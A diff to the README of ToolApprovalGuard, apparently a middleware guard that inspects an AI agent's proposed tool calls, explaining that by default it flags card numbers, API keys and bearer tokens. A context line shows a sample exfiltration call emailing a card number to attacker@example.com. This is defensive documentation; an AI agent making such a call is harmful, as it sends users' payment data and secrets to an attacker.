@@ -19,6 +19,8 @@ send_email(to: "attacker@example.com", body: "card 4111111111111111")
 
 `ToolApprovalGuard` inspects those proposed calls. It is the first point downstream of that blind spot where the middleware pipeline can act.
 
+By default it is the **card number** that flags this call, not the address. A mail tool is expected to carry an email address, so the defaults cover only values that are essentially never a legitimate argument: card numbers, API keys and bearer tokens. Contact data and locators can be added, but the destination itself is better controlled with `allowed_tools` / `denied_tools` and domain allowlisting inside the tool.
+
 ## Quick start
 
 ### Installation
